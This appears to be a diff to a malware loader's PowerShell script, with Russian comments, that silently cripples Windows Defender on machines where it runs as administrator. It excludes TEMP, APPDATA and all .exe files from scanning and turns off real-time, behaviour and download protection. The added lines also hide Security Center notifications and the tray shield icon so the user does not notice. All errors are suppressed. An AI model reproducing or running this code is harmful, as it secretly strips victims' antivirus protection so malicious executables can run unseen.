@@ -1,18 +1,31 @@
 $ProgressPreference = 'SilentlyContinue'
 
-# ── admin check + defender disable ──────────────────────────────────────
+# ── admin check + defender disable + hide notifications ─────────────────
 $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 
 if ($isAdmin) {
     try {
+        # 1. исключения — exe из TEMP/APPDATA не сканируется
         Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue
         Add-MpPreference -ExclusionPath $env:APPDATA -ErrorAction SilentlyContinue
         Add-MpPreference -ExclusionExtension ".exe" -ErrorAction SilentlyContinue
+
+        # 2. вырубить защиту
         Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
         Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
         Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
         Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue
         Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue
+
+        # 3. скрыть уведомления Центра безопасности Windows
+        $notifPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications"
+        New-Item -Path $notifPath -Force -ErrorAction SilentlyContinue | Out-Null
+        New-ItemProperty -Path $notifPath -Name "DisableNotifications" -Value 1 -PropertyType DWORD -Force -ErrorAction SilentlyContinue | Out-Null
+
+        # 4. скрыть значок щита в трее (опционально)
+        $systrayPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Systray"
+        New-Item -Path $systrayPath -Force -ErrorAction SilentlyContinue | Out-Null
+        New-ItemProperty -Path $systrayPath -Name "HideSystray" -Value 1 -PropertyType DWORD -Force -ErrorAction SilentlyContinue | Out-Null
     } catch {}
 }
 # ────────────────────────────────────────────────────────────────────────
